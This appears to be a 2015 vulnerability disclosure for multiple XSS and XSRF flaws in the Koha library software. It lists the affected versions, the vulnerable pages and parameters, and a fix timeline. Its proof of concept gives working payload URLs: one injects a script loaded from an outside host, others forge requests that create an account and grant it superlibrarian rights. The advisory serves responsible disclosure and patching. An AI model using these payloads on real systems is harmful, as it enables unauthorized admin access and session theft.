@@ -1,0 +1,117 @@
+# Exploit Title: Koha Open Source ILS - Multiple XSS and XSRF Vulnerabilities
+# Google Dork:
+# Date: 25/06/2015
+# Exploit Author: Raschin Tavakoli, Bernhard Garn, Peter Aufner and Dimitris Simos - Combinatorial Security Testing Group of SBA Research (cst@sba-research.org)
+# Vendor Homepage: koha-community.org
+# Software Link: https://github.com/Koha-Community/Koha
+# Version: 3.20.x <= 3.20.1, 3.18.x <= 3.18.8, 3.16.x <= 3.16.12
+# Tested on: Debian Linux
+# CVE : CVE-2015-4630, CVE-2015-4631
+
+
+### CVE-2015-4631 ### 
+
+#### Titel: ####
+Multiple XSS and XSRF vulnerabilities in Koha 
+
+#### Type of vulnerability: ####
+Koha suffers from multiple critical XSS and XSRF vulnerabilities
+
+##### Exploitation vector:
+The attack can be performed through a compromised user account (for example previous password retrieval if student user acoount through SQLI - CVE-2015-4633) or due to user that clicks on a malicious link (for example in a phishing mail, forum link etc)
+
+##### Attack outcome:
+1. An attacker may escalate privileges and even gain superlibrarian permissions.
+2. An attacker may target other users by stealing session tokens, impersonating them or exploiting browser vulnerabilities to gain access on their machines.
+3. Perform unauthorized actions with the permissions of a staff member
+4. Exploit other known server-side vulnerabilities (see CVE-2015-4633 and CVE-2015-4632) to fully compromise the websever
+
+#### Impact: ####
+{low,medium,high,critical}
+critical
+
+#### Software/Product name: ####
+Koha
+ 
+#### Affected versions: ####
+* <= Koha 3.20.1
+* <= Koha 3.18.8 
+* <= Koha 3.16.12
+
+#### Fixed in version: ####
+* version 3.20.1 http://koha-community.org/security-release-koha-3-20-1/,
+* version 3.18.8 http://koha-community.org/security-release-koha-3-18-8/, 
+* version 3.16.12 http://koha-community.org/security-release-koha-3-16-12/
+
+#### Vendor: ####
+http://koha-community.org/ (Open Source)
+
+#### CVE number: ####
+CVE-2015-4631
+
+#### Timeline ####
+* `2015-06-18` identification of vulnerability 
+* `2015-06-18` 1st contact to release maintainer, immediate reply
+* `2015-06-23` new release with fixed vulnerabilities
+
+#### Credits: ####
+RGhanad-Tavakoli@sba-research.org
+---
+Vulnerability Disclosure by Combinatorial Security Testing Group of SBA Research.
+Contact: cst@sba-research.org
+
+#### References:
+http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14416
+http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14423
+http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=14418
+
+http://koha-community.org/security-release-koha-3-20-1/
+http://koha-community.org/security-release-koha-3-18-8/
+http://koha-community.org/security-release-koha-3-16-12/
+
+#### Description: ####
+Koha suffers from various critical XSS and XSRF vulnerabilities due to imprope input validation. The site also lacks in the implementation of challenge tokens that prevent cross-site forgery (XSRF) attacks. This allows remote remote attackers to inject arbitrary web script or HTML and completely compromise the webpage. 
+
+The following pages are affected from stored XSS flaws:
+
+/cgi-bin/koha/opac-shelves.pl
+/cgi-bin/koha/virtualshelves/shelves.pl
+
+The following pages are affected from relfective XSS flaws:
+
+/cgi-bin/koha/opac-shelves.pl 				(parameters: "direction", "display")
+/cgi-bin/koha/opac-search.pl 				(parameters: "tag")
+/cgi-bin/koha/authorities/authorities-home.pl 		(parameters: "value") 
+/cgi-bin/koha/acqui/lateorders.pl 			(parameters: "delay")
+/cgi-bin/koha/admin/auth_subfields_structure.pl 	(parameters: "authtypecode","tagfield")
+/cgi-bin/koha/admin/marc_subfields_structure.pl		(parameters: "tagfield")
+/cgi-bin/koha/catalogue/search.pl			(parameters: "limit")
+/cgi-bin/koha/serials/serials-search.pl			(parameters: "bookseller_filter", "callnumber_filter", "EAN_filter", "ISSN_filter", "publisher_filter", "title_filter") 
+/cgi-bin/koha/suggestion/suggestion.pl 			(parameters: "author", "collectiontitle", "copyrightdate", "isbn", "manageddate_from", "manageddate_to", "publishercode", "suggesteddate_from", "suggesteddate_to")
+
+#### Proof-of-concept: ####
+Attack scenario:
+
+Alice, a student with restricted permissions on the system, receives a phishing mail (or reads in some forum) and clicks the following link:
+
+http://<opac-interface>/cgi-bin/koha/opac-shelves.pl?shelves=1&addshelf=Malicious+Input+<script+src='http://cst.sba-research.org/x.js'/>&sortfield=title&category=2&allow_add=0&allow_delete_own=1&allow_delete_other=0
+
+Bob, library admin, recognizes the new malicious list entry. He logs into the staff area and browses the public lists in order to delete the entry. Once he opens 
+
+http://<staff-interface>/cgi-bin/koha/virtualshelves/shelves.pl
+
+the malcious code get's executed. The code can then perform any unauthorized actions with the pemissions of user bob. For example:
+
+Create new user:
+
+http://testbox:9002/cgi-bin/koha/members/memberentry.pl?nodouble=&destination=&check_member=&borrowernumber=&nodouble=&title=&firstname=&othernames=&sex=&streetnumber=&streettype=&address2=&city=&state=&zipcode=&country=&phone=&phonepro=&mobile=&email=&emailpro=&fax=&B_address=&B_address2=&B_city=&B_state=&B_zipcode=&B_country=&B_phone=&B_email=&contactnote=&altcontactsurname=&altcontactfirstname=&altcontactaddress1=&altcontactaddress2=&altcontactaddress3=&altcontactstate=&altcontactzipcode=&altcontactcountry=&altcontactphone=&sort1=&sort2=&dateexpiry=&opacnote=&borrowernotes=&patron_attr_1=&BorrowerMandatoryField=surname%7Cdateofbirth%7Ccardnumber%7Caddress&category_type=A&updtype=I&op=insert&surname=hacker&dateofbirth=10%2F06%2F2000&address=fictional&select_city=%7C%7C%7C&cardnumber=9182734629182364&branchcode=MAURES&categorycode=P_COM&dateenrolled=24%2F06%2F2015&userid=hacker&password=hacker&password2=hacker&patron_attr_1_code=PROFESSION&setting_messaging_prefs=1&modify=yes&borrowernumber=&save=Save&setting_extended_patron_attributes=1
+
+Give the new user superlibririan permission:
+
+http://testbox:9002/testbox:9002/cgi-bin/koha/members/member-flags.pl?member=7855&newflags=1&flag=superlibrarian
+
+The attacker can now log as superlibrarian.
+
+Side Note: In order to make the attack work, alice needs to be logged in to the Open Public Catalog interface at the time of when clicking the malicious link.
+Alice needs to have access to the OPAC interface and to have permissions to create public lists.
+
